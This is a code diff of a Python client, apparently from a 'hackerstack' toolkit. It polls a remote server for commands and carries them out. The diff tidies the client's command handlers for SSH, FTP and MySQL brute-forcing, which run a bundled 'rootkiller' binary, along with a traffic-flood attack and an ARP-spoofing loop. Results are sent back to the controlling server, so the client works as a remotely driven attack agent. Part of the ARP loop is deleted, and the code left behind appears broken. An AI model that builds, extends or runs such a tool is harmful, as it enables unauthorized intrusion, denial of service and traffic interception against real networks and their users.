@@ -87,11 +87,16 @@ driver_code = None
 command = 'none'
 def input_console():
     global command
+
+def del_space_in_list(l):
+    for i in l:
+        if str(i).strip() == '':
+            l.remove(i)
+    return l
+
         
 def send_reverse_ok():
     requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":"收到指令正在执行!"}))
-    time.sleep(0.5)
-    requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":"none"}))
 
 def deal_command(command):
     try:
@@ -112,7 +117,7 @@ def deal_command(command):
                 target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":command}))
 
             elif command.startswith('ssh_brute '):
-                all_args = command.split(' ')
+                all_args = del_space_in_list(command.split(' '))
                 ip = all_args[1]
                 port = all_args[2]
                 user = all_args[3]
@@ -124,13 +129,15 @@ def deal_command(command):
                     run_command = './hackerstack_driver/rootkiller --ssh '+ip+' '+port+' '+user
 
                 # 获取命令行输出
+                print(all_args)
+                print(run_command)
                 command = os.popen(run_command).read()
                 print(command)
                 requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":command}))
                 return
         
             elif command.startswith('ftp_brute '):
-                all_args = command.split(' ')
+                all_args = del_space_in_list(command.split(' '))
                 ip = all_args[1]
                 port = all_args[2]
                 user = all_args[3]
@@ -148,7 +155,7 @@ def deal_command(command):
                 return
         
             elif command.startswith('mysql_brute '):
-                all_args = command.split(' ')
+                all_args = del_space_in_list(command.split(' '))
                 ip = all_args[1]
                 port = all_args[2]
                 user = all_args[3]
@@ -166,7 +173,7 @@ def deal_command(command):
                 return
         
             elif command.startswith('traffic_attack '):
-                all_args = command.split(' ')
+                all_args = del_space_in_list(command.split(' '))
                 target = all_args[1]
                 user_num = all_args[2]
                 one_user_num = all_args[3]
@@ -183,7 +190,7 @@ def deal_command(command):
                 return
             
             elif command.startswith('arp_spoof '):
-                all_args = command.split(' ')
+                all_args = del_space_in_list(command.split(' '))
                 print(all_args)
                 target_ip = all_args[1] # 目标设备的IP地址
                 print(f"欺骗目标IP: {target_ip}")
@@ -198,23 +205,19 @@ def deal_command(command):
                         if arp_spoof_stop:
                             break
                         arp_spoof(target_ip, gateway_ip)
-                        arp_spoof(gateway_ip, target_ip)
-                        packet_count += 2
-                        if packet_count % 16 == 0:
-                            requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":f"欺骗中...已发送{packet_count}个ARP包"}))
-                        print(f"Sent {packet_count} packets.")
-                        time.sleep(0.3)
-
-                except KeyboardInterrupt:
                     print("\nDetected CTRL+C. Restoring ARP tables and exiting...")
                     restore(target_ip, gateway_ip)
                     sys.exit(0)
+                except:
+                    print("Unexpected error:", sys.exc_info()[0])
+                    restore(target_ip, gateway_ip)
 
             elif command == 'arp_spoof_stop':
                 arp_spoof_stop = True
                 requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":"arp欺骗已停止"}))
                 return
     except BaseException as e:
+        print(e)
         target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":"指令执行失败!"}))
         return
 
@@ -223,8 +226,13 @@ def init_driver():
     print("[INFO] 网关IP: "+get_gateway_ip())
 
     if os.name == 'posix':
-        if os.getlogin() == 'root' or sys.argv[0].find('sudo') != -1:
-            print("[ERROR] 请以root权限运行,可以在命令前加sudo")
+        print("[INFO] 当前用户: "+os.getlogin())
+        print(sys.argv)
+        print(os.getuid())
+        if os.getuid() == 0:
+            pass
+        else:
+            print("[INFO] 请以管理员权限运行")
             exit()
 
     if os.name == 'nt':
@@ -247,28 +255,53 @@ def init_driver():
             zip_ref.extractall("./hackerstack_driver")
         os.remove("./hackerstack_driver.zip")
         print("[INFO] 解压完成")
+        print("[正在处理动态链接库...]")
+        if os.name == 'posix':
+            os.system("sudo apt install libmysqlclient-dev")
+            os.system("sudo apt install libcurl4-openssl-dev")
+            os.system("sudo apt install libssl-dev")
+            print("[INFO] 动态链接库处理完成")
+        else:
+            print("Windows下采用静态编译,无需处理动态链接库")
     
 
     print("[INFO] 完成驱动程序附加组件初始化，不保证驱动程序的完整性")
 
+
+def setInterval(func, sec):
+    """ 定时执行函数，类似于JavaScript中的setInterval """
+    def func_wrapper():
+        setInterval(func, sec)
+        func()
+    threading.Timer(sec, func_wrapper).start()
+
+def clearInterval(timer):
+    """ 停止定时执行，类似于JavaScript中的clearInterval """
+    timer.cancel()
 
 if __name__ == '__main__':
     init_driver()
 
     driver_code = str(input("请输入识别码: ")).strip()
     try:
-        target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":json.dumps(fn_object)}))
+        def send_ok():
+            target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":json.dumps(fn_object)}))
+        threading.Thread(target=send_ok).start()
         t = threading.Thread(target=input_console)
         t.start()
-        while True:
+        def run():
+            global command
             target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":command}))
             try:
                 deal_command(target.text)
             except BaseException as e:
                 target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":e}))
             command = 'none'
-            time.sleep(0.3)
         # r = requests.get(api_server+"/virus_clear_command/"+driver_code)
+        timer = threading.Timer(0.7, lambda: setInterval(run, 0.7))
+        timer.start()
+        while True:
+            input()
     except:
         exit()
 
